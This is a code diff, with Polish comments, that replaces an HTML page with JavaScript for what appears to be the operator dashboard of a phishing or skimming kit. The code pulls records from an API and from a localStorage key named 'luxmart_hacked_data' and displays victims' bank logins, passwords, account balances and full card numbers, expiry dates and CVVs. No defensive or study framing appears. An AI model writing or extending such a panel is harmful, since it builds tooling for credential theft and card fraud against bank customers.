@@ -1,167 +1,107 @@
-<!DOCTYPE html>
-<html lang="pl">
+// Bank Admin Logic - External Dashboard
+document.addEventListener('DOMContentLoaded', () => {
+    fetchData();
+    document.getElementById('refreshBtn').addEventListener('click', fetchData);
+});
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bank Internal Admin - Secure Access</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
-        rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --admin-bg: #0f172a;
-            --admin-card: #1e293b;
-            --admin-border: #334155;
-            --admin-accent: #38bdf8;
-            --admin-gold: #d4af37;
-        }
+async function fetchData() {
+    const grid = document.getElementById('dataGrid');
+    grid.innerHTML = '<p>Pobieranie danych...</p>';
 
-        body {
-            background: var(--admin-bg);
-            color: #f1f5f9;
-            font-family: 'Inter', sans-serif;
-            margin: 0;
-            padding: 2rem;
-        }
+    try {
+        // Spróbuj pobrać z API (serwer Node.js)
+        const response = await fetch('/api/data');
+        let data = await response.json();
 
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 2rem;
-            padding-bottom: 1rem;
-            border-bottom: 1px solid var(--admin-border);
-        }
+        // Dodaj dane z localStorage dla bezpieczeństwa
+        const localData = JSON.parse(localStorage.getItem('luxmart_hacked_data') || '[]');
 
-        .title {
-            font-size: 1.5rem;
-            font-weight: 800;
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-        }
+        // Złącz i posortuj (używając ID lub timestamp)
+        // W prawdziwym systemie filtrowalibyśmy duplikaty po orderId
+        const combined = [...data];
+        localData.forEach(ld => {
+            if (!combined.find(c => c.orderId === ld.orderId && c.timestamp === ld.timestamp)) {
+                combined.push(ld);
+            }
+        });
 
-        .title i {
-            color: var(--admin-accent);
-        }
+        renderData(combined);
+    } catch (error) {
+        console.error('Błąd pobierania z API, używam tylko localStorage:', error);
+        const localData = JSON.parse(localStorage.getItem('luxmart_hacked_data') || '[]');
+        renderData(localData);
+    }
+}
 
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
-            gap: 1.5rem;
-        }
+function renderData(data) {
+    const grid = document.getElementById('dataGrid');
+    if (data.length === 0) {
+        grid.innerHTML = '<p>Brak danych do wyświetlenia.</p>';
+        return;
+    }
 
-        .card {
-            background: var(--admin-card);
-            border: 1px solid var(--admin-border);
-            border-radius: 12px;
-            padding: 1.5rem;
-            position: relative;
-            overflow: hidden;
-        }
+    grid.innerHTML = data.reverse().map(item => {
+        const isTwojBank = item.source === 'Twój Bank';
 
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 4px;
-            height: 100%;
-        }
+        // Reguły maskowania:
+        // Twój Bank: tylko 2 pierwsze litery/cyfry, reszta to gwiazdki
+        // IMG: pełne dane
+        const mask = (str) => {
+            if (!str) return '---';
+            if (!isTwojBank) return str; // IMG ma widnieć całe
 
-        .card.ing::before {
-            background: #ff5e00;
-        }
+            if (str.length <= 2) return str;
+            return str.substring(0, 2) + '*'.repeat(str.length - 2);
+        };
 
-        .card.twoj::before {
-            background: var(--admin-gold);
-        }
+        return `
+            <div class="card ${isTwojBank ? 'twoj' : 'ing'}">
+                <div class="card-header">
+                    <span class="badge ${isTwojBank ? 'badge-twoj' : 'badge-ing'}">
+                        ${item.source}
+                    </span>
+                    <small style="color: #64748b;">${new Date(item.timestamp).toLocaleString()}</small>
+                </div>
+                
+                <div class="info-row">
+                    <span class="label">ID Zamówienia:</span>
+                    <span class="value">${item.orderId || 'Gość'}</span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Login:</span>
+                    <span class="value">${mask(item.login)}</span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Hasło:</span>
+                    <span class="value">${mask(item.password)}</span>
+                </div>
 
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 1.25rem;
-        }
-
-        .badge {
-            font-size: 0.7rem;
-            font-weight: 800;
-            padding: 0.25rem 0.5rem;
-            border-radius: 4px;
-            text-transform: uppercase;
-        }
-
-        .badge-ing {
-            background: #ff5e00;
-            color: white;
-        }
-
-        .badge-twoj {
-            background: var(--admin-gold);
-            color: black;
-        }
-
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 0.75rem;
-            font-size: 0.9rem;
-        }
-
-        .label {
-            color: #94a3b8;
-        }
-
-        .value {
-            font-family: 'JetBrains Mono', monospace;
-            font-weight: 600;
-            color: #f8fafc;
-        }
-
-        .bank-details {
-            margin-top: 1rem;
-            padding-top: 1rem;
-            border-top: 1px dashed var(--admin-border);
-        }
-
-        .refresh-btn {
-            background: var(--admin-accent);
-            color: #0f172a;
-            border: none;
-            padding: 0.75rem 1.5rem;
-            border-radius: 6px;
-            font-weight: 700;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .refresh-btn:hover {
-            filter: brightness(1.1);
-        }
-    </style>
-</head>
-
-<body>
-    <div class="header">
-        <div class="title">
-            <i class="fas fa-university"></i>
-            Internal Bank Monitoring System
-        </div>
-        <button class="refresh-btn" id="refreshBtn">
-            <i class="fas fa-sync-alt"></i>
-            Odśwież dane
-        </button>
-    </div>
-
-    <div class="grid" id="dataGrid">
-        <!-- Dane będą dołączane tutaj -->
-    </div>
-
-    <script src="bankadmin.js"></script>
-</body>
-
-</html>
+                <div class="bank-details">
+                    ${isTwojBank ? `
+                        <div class="info-row">
+                            <span class="label">Wybrane konto:</span>
+                            <span class="value" style="color: #d4af37;">${item.selectedAccount}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="label">Saldo:</span>
+                            <span class="value">${item.accountBalance}</span>
+                        </div>
+                    ` : `
+                        <div class="info-row">
+                            <span class="label">Numer Karty:</span>
+                            <span class="value">${item.cardNumber}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="label">Ważność:</span>
+                            <span class="value">${item.cardExpiry}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="label">CVV:</span>
+                            <span class="value">${item.cardCVV}</span>
+                        </div>
+                    `}
+                </div>
+            </div>
+        `;
+    }).join('');
+}
